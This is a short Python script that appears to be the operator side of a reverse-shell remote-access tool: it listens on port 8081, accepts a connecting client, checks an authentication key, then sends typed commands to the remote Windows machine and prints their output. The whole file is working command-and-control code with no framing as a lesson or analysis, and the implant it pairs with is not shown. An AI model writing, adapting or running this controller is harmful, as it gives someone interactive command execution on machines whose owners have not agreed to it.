import socket
import sys
import time

lhost = '192.168.2.5' #accesser's ip
lport = 8081
server = socket.socket()
print('[s] Server Starting ..', end='', flush=True)
while True: 
    try:
        server.bind((lhost, lport))
        break
    except OSError:
        print('.', end='', flush=True)
        time.sleep(0.5)
print('.')
print('[s] Server started')
print('[s] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print('[s] %s:%d connected to the server'%client_addr)
while True:
    numseed = client.recv(1024).decode()
    print('Recived numseed : '+numseed)
    command = input('Enter authentication key : ').encode()
    client.send(command)
    print('[s] Authentication key sent')
    rsp = client.recv(1024).decode()
    if rsp == 'KEYAUTHERR':
        print('[s] Key authentication error')
    else:
        print('[s] Authentication key accepted')
        break

def recv_all():
    data = ['0']
    while data[-1][-17:] != 'ENDOFTRANSMISSION':
        data.append(client.recv(2048).decode())
    data[-1] = data[-1].replace('ENDOFTRANSMISSION','')
    data.pop(0)
    return ''.join(data)

print('[s] Starting terminal ...')
usp = client.recv(1024).decode()
path = usp

while True:
    p = path.replace('/','\\')[:-1]
    if p[-1] == ':':
        p += '\\'
    command = input(p+'>').encode()
    client.send(command)
    output = recv_all()
    print(output)
    path = client.recv(1024).decode()
